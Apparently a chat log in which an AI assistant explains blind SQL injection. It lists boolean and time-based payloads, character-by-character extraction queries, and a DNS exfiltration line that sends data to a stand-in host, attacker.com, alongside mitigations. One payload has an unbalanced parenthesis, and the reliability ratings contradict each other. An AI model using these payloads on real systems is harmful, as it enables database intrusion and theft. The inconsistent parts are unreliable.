

# Inferential SQL Injection (Blind SQLi)

Inferential SQL Injection, also known as Blind SQLi, is a type of attack where the attacker can't see the direct results of their injection but can infer information by observing the application's behavior.

## Key Characteristics

1. **No direct output**: Unlike classic SQLi, there's no visible database output
2. **Boolean-based**: Inference through true/false responses
3. **Time-based**: Inference through response delays

## Common Attack Techniques

### Boolean-Based Blind SQLi
```sql
' AND 1=1 -- 
' AND 1=2 -- 
```

### Time-Based Blind SQLi
```sql
'; IF (1=1) WAITFOR DELAY '0:0:5' -- 
'; IF (1=2) WAITFOR DELAY '0:0:5' -- 
```

## Detection Methods

1. Observe differences in responses to true/false conditions
2. Measure response times for time-based payloads
3. Look for changes in HTTP status codes or error messages

## Exploitation Process

1. Identify injectable parameters
2. Determine backend database type
3. Craft conditional queries to extract data bit by bit:
continue from exploitation process point number 3


## Exploitation Process (continued)

3. **Craft conditional queries to extract data bit by bit**:
   - For Boolean-based: Use logical conditions to infer data character by character
     ```sql
     ' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1) = 'a' -- 
     ```
   - For Time-based: Use delays to confirm character matches
     ```sql
     '; IF (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1) = 'a') WAITFOR DELAY '0:0:5' -- 
     ```

4. **Systematically extract information**:
   - Database version
   - Table names
   - Column names
   - Actual data records

5. **Automate the process**:
   - Use tools like SQLmap for efficient exploitation
   - Script custom attacks for specific scenarios

## Example Boolean-Based Attack Pattern

```sql
' AND (SELECT ASCII(SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables),1,1))) > 100 -- 
```

## Example Time-Based Attack Pattern

```sql
'; IF (SELECT ASCII(SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables),1,1))) > 100 WAITFOR DELAY '0:0:5' -- 
```

## Mitigation Strategies

1. **Use prepared statements with parameterized queries**
2. **Implement proper input validation**
3. **Apply principle of least privilege for database accounts**
4. **Configure proper error handling** (don't reveal database errors)
5. **Use Web Application Firewalls (WAFs)** to detect and block injection attempts

## Advanced Techniques

- Combine Boolean and Time-based approaches for reliability
- Use bit-shifting techniques for faster data extraction
- Exploit DNS exfiltration in restricted environments:
  ```sql
  '; DECLARE @data VARCHAR(1024); SELECT @data = (SELECT TOP 1 username FROM users); EXEC('master..xp_dirtree "\\'+@data+'.attacker.com\share"') -- 
```
Remember that Blind SQLi attacks can be time-consuming but are often successful against vulnerable applications that don't properly sanitize input.

Explain TIme based and Boolean Based more thorougly

 # Inferential SQL Injection (Blind SQLi): Time-Based and Boolean-Based

## Time-Based Blind SQL Injection

Time-based blind SQL injection is a technique where the attacker infers information by observing timing differences in the database responses.

### How it works:
1. The attacker injects SQL commands that cause the database to pause for a specified time if a condition is true
2. The application's response time indicates whether the condition was true or false
3. By measuring response times, the attacker can extract data bit by bit

### Example:
```sql
SELECT * FROM users WHERE username = 'admin' AND IF(1=1,SLEEP(5),0)--
```
- If the condition (1=1) is true, the database sleeps for 5 seconds before responding
- If false, it responds immediately

### Characteristics:
- Relies on database functions like `SLEEP()`, `WAITFOR DELAY`, or heavy queries
- Works even when no visible output differences exist
- Very slow but reliable method
- Often used when other blind techniques fail

## Boolean-Based Blind SQL Injection

Boolean-based blind SQL injection relies on observing differences in application behavior based on true/false conditions in injected queries.

### How it works:
1. The attacker crafts queries that return different responses based on boolean conditions
2. The application's behavior (error messages, content changes, HTTP status codes) reveals whether the condition was true or false
3. By systematically testing conditions, the attacker can reconstruct data

### Example:
```sql
SELECT * FROM products WHERE id = 1 AND SUBSTRING((SELECT password FROM users WHERE username = 'admin'), 1, 1) = 'a'
```
- If the first character of admin's password is 'a', the query returns product details
- If not, it might return an empty result or error page

### Characteristics:
- Faster than time-based but requires observable differences in responses
- Often uses string comparison functions (SUBSTRING, LIKE)
- Relies on inference from subtle application behavior changes
- Commonly used when errors are suppressed but application behavior differs

## Key Differences:

| Aspect            | Time-Based                          | Boolean-Based                     |
|-------------------|-------------------------------------|------------------------------------|
| Detection Method  | Measures response time              | Observes behavioral differences    |
| Speed             | Very slow                           | Relatively faster                  |
| Reliability       | High (timing is unambiguous
complete the reliabilty in table key differences

 Certainly! Below is a completed table outlining the key differences between **Inferential SQL Injection (Blind SQLi)** and other types of SQL Injection, with a focus on **reliability**:

| **Feature**            | **Inferential (Blind) SQLi**                          | **Classic (Error-Based/Union-Based) SQLi**          | **Boolean-Based Blind SQLi**                       | **Time-Based Blind SQLi**                          |
|-------------------------|------------------------------------------------------|----------------------------------------------------|---------------------------------------------------|---------------------------------------------------|
| **Reliability**         | Moderate to High (depends on inference accuracy)     | High (direct data retrieval)                       | Moderate (relies on true/false responses)         | Low to Moderate (affected by network delays)      |
| **Detection Method**    | Observing behavioral changes in responses            | Direct error messages or UNION-based exploitation  | Boolean conditions (true/false responses)         | Delays in response time                           |
| **Data Extraction Speed**| Slow (requires many requests for inference)          | Fast (immediate data leakage via errors/unions)    | Slower than classic but faster than time-based    | Very slow (requires timing delays per request)    |
| **Stealthiness**        | High (no direct errors, harder to detect)           | Low (errors may trigger WAFs/logs)                 | Moderate                                          | High                                              |
| **Use Case Example**    | When the app shows generic responses but behaves differently based on queries. | When the app leaks errors or allows UNION queries.  | When boolean conditions affect output indirectly.  | When no direct feedback exists except delays.     |

### Explanation of Reliability:
- **Inferential SQLi**: Reliability depends on how accurately an attacker can infer data from subtle behavioral differences.
- **Classic SQLi**: Highly reliable because it directly exposes data through errors or UNION queries.
- **Boolean-Based Blind**: Moderately reliable since it relies on binary responses, which can sometimes be ambiguous.
- **Time-Based Blind**: Least reliable due to potential false positives from network latency.

Would you like any refinements or additional details?